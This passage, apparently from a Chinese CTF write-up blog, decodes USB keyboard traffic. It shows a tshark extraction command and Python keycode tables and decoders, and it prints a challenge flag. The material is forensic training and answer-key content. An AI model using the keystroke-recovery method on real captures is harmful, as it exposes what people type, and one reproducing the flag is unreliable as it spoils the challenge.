class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">file</span>):</span><br><span class="line">    keys=<span class="built_in">open</span>(file)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">                 <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">                output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    keys.close()</span><br><span class="line">    </span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">del</span> output[a]</span><br><span class="line">            <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">                flag+=<span class="number">1</span></span><br><span class="line">                output.pop(i)</span><br><span class="line">                <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                    flag=<span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">                output[i]=output[i].upper()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">out(<span class="string">&quot;1.txt&quot;</span>)</span><br><span class="line">out(<span class="string">&quot;2.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721631569202-6.png" alt="img"></p>
<p>output1:16进制转化为rar压缩包</p>
<p>output2:rar压缩包密码</p>
<p>flag{20de17cc-d2c1-4b61-bebd-41159ed7172d}</p>
<h3 id="MoeCTF-2022-usb"><a href="#MoeCTF-2022-usb" class="headerlink" title="[MoeCTF 2022]usb"></a>[MoeCTF 2022]usb</h3><p>找个类似题目练习一下</p>
<p><img src="/img/1721631569202-7.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r <span class="number">3.</span>pcapng -T fields -e usbhid.data -Y <span class="string">&quot;usb.data_len == 8&quot;</span> -Y <span class="string">&#x27;usb.src ==&quot;2.2.1&quot;&#x27;</span> &gt; <span class="number">3.</span>txt</span><br></pre></td></tr></table></figure>

<p><strong>加****：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;3.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out3.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 鼠标流量的话len改为8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>键盘流量转化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">file</span>):</span><br><span class="line">    keys=<span class="built_in">open</span>(file)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">                 <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">                output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    keys.close()</span><br><span class="line">    </span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">del</span> output[a]</span><br><span class="line">            <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">                flag+=<span class="number">1</span></span><br><span class="line">                output.pop(i)</span><br><span class="line">                <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                    flag=<span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">                output[i]=output[i].upper()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">out(<span class="string">&quot;3.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721631569202-8.png" alt="img"></p>
